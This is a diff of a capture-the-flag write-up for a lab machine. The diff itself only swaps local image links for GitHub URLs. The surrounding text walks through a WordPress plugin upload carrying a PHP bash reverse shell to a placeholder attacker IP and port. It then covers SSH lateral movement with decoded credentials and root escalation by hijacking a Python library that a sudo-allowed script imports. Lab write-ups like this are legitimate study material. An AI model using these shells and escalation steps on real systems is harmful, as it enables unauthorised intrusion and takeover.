@@ -239,7 +239,7 @@ Now login at /wp-admin/
 
 login to wordpress with the user and password created by the exploit 
 
-![img](assets/2.PNG)
+![img](https://github.com/btxcode/pork/blob/main/assets/2.png)
 
 ### Shell
 
@@ -264,25 +264,25 @@ exec("/bin/bash -c 'bash -i >& /dev/tcp/[ipattacker]/[portattacker] 0>&1'");
 save with the name you want for example shell.php then archive it into a zip file.
 upload the zip file in the plugin menu and activate it.
 
-![img](assets/3.PNG)
+![img](https://github.com/btxcode/pork/blob/main/assets/3.png)
 
 ## Lateral Movement
 
 searched some important files and got mine.bak 
 
-![img](assets/4.PNG)
+![img](https://github.com/btxcode/pork/blob/main/assets/4.png)
 
 decode using [dcode.fr](https://www.dcode.fr/alphabet-phonetique-otan) and get the following result
 
-![img](assets/5.PNG)
+![img](https://github.com/btxcode/pork/blob/main/assets/5.png)
 
 use ssh to access user d3nt1
 
-![img](assets/6.PNG)
+![img](https://github.com/btxcode/pork/blob/main/assets/6.png)
 
 found a hidden file named .msgenc , its contents are an encoded message.
 
-![img](assets\7.PNG)
+![img](https://github.com/btxcode/pork/blob/main/assets/7.png)
 
 i used [cyberchef](https://gchq.github.io/CyberChef/) to decode the message and got the following result
 
@@ -300,18 +300,18 @@ how big profit we sell.
 After these messages we get a password that is `napinadar`, check the user with `cat /etc/passwd` and get the user `parul14n`
 here we can get user.txt
 
-![img](assets/8.PNG)
+![img](https://github.com/btxcode/pork/blob/main/assets/8.png)
 
 ## Privilege Escalation
 
 Check with ```sudo -l```
 
-![img](assets/9.PNG)
+![img](https://github.com/btxcode/pork/blob/main/assets/9.png)
 
 User `parul14n` can access `python3.8` and `benefit.py` with sudo access without password.
 Check the `benefit.py` file and we can see that it calls the python library `webbrowser`, we can't edit the file, but we can edit the `webbrowser.py` library
 
-![img](assets/10.PNG)
+![img](https://github.com/btxcode/pork/blob/main/assets/10.png)
 
 After understanding a few lines of code add [payload](https://www.oreilly.com/library/view/hands-on-red-team/9781788995238/cd15b05d-822f-494d-939a-ae5a671222ff.xhtml) after the following line of code
 
@@ -335,8 +335,8 @@ def open(url, new=0, autoraise=True):
                 register_standard_browsers()
 ```
 
-![img](assets/11.PNG)
+![img](https://github.com/btxcode/pork/blob/main/assets/11.png)
 
 Executing the commands `sudo /usr/bin/python3.8 /home/parul14n/Desktop/benefit.py` should give us a reverse shell as Root, after which the final flag can be accessed.
 
-![img](assets/12.PNG)
+![img](https://github.com/btxcode/pork/blob/main/assets/12.png)
